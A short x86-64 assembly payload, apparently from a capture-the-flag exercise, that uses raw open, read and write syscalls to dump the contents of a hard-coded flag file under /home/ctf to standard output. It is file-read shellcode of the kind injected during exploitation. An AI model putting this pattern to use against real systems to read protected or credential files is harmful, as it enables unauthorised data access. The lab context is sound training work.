[BITS 64]
global main

section .text
main: 
    mov rax, 2
    lea rdi, [rel flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 100
    mov rax, 1
    syscall

section .data
    flag: db "/home/ctf/flag-0479f1dcda629bbe833598bce876a647.txt", 0 